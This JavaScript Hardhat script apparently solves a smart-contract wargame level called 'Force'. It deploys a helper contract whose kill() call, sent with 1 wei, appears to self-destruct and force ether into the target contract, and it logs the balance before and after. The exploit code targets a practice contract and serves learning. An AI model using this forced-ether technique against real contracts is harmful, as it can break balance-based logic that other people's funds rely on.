
const hre = require("hardhat");

async function main() {

    const [deployer, signer0, signer1] = await hre.ethers.getSigners();

    const contract = await hre.ethers.getContractAt("Force", "0x4075382D0a76E154E032cA8D73062039a6bDc960", signer0);
    console.log("Contract deployed to address:", contract.address);
    console.log("Contract balance:", (await hre.ethers.provider.getBalance(contract.address)).toString());

    const testContract = await hre.ethers.deployContract("TestForce", deployer);
    console.log("Test contract deployed to address:", testContract.address);
    await testContract.kill(contract.address, {
      value: hre.ethers.utils.parseUnits("1", "wei")
    })

    console.log("Contract balance:", (await hre.ethers.provider.getBalance(contract.address)).toString());


}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
